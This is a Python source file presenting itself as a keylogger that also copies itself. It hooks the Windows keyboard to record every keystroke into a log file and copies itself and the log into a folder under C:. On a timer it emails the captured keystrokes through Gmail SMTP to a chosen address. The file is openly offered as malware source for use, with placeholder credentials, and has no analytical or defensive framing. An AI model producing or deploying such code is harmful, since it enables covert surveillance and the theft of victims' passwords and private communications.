
#The purpose of this program is to record all the key strokes made
#by the user then sends that file to an email address.
#The program also replicates itself and is saved in the root directory.
#Please note that the smtp server used is gmail so you would need a gmail account to use

#importation of libraries 
import threading
import pyHook
import pythoncom
import sys
import logging
import smtplib
import os
#import winshell
#from win32com.client import Distpatch

#File that records all the logs
flie_log = "log.txt"
#The Format in which it is saved
FORMAT = '%(message)s'




#Function that gets all key strokes from the user
def help():
    def OnKeyBoardEvent(event):
        logging.basicConfig(filename = flie_log, level = logging.DEBUG,format=FORMAT)
        chr(event.Ascii)
        logging.log(10,chr(event.Ascii))
        replicate()
        return True



    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyBoardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

#This Function is used to send the contents of the log file to email
def sendemail():
    from_addr    = 'from whom ..... the sender@gmail.com'
    to_addr_list = ['The recipiant @gmail.com']
    subject      = 'Todays Update' 
    message      = '' 
    login        = 'Your email address@gmail.com' 
    password     = 'your password'
    smtpserver='smtp.gmail.com:587'
    f = open("log.txt", 'r')
    header  = 'From: %s\n' % from_addr
    header += 'To: %s\n' % ','.join(to_addr_list)
    header += 'Subject: %s\n\n' % subject
    message = f.read()
    server = smtplib.SMTP(smtpserver)
    server.starttls()
    server.login(login,password)
    problems = server.sendmail(from_addr, to_addr_list, message)
    server.quit()
                        
#This function replicates the code then sends the info to the email address
def replicate():
    os.mkdir("C:\clone") #Program makes this folder then replicates itself in it
    os.system(r"copy log.txt C:\clone")
    os.system(r"copy worm.py C:\clone")
    t = threading.Timer(10.0, sendemail) #timer that sends an email every 10 seconds
    t.start() #start timer

    
#main function to run everything starting with the helper function
def main():
    #script = argv
    #name = str(script[0])
    #cmd = 'start log.txt'
    #os.system(cmd)
    help()


if __name__ == "__main__":
    main()


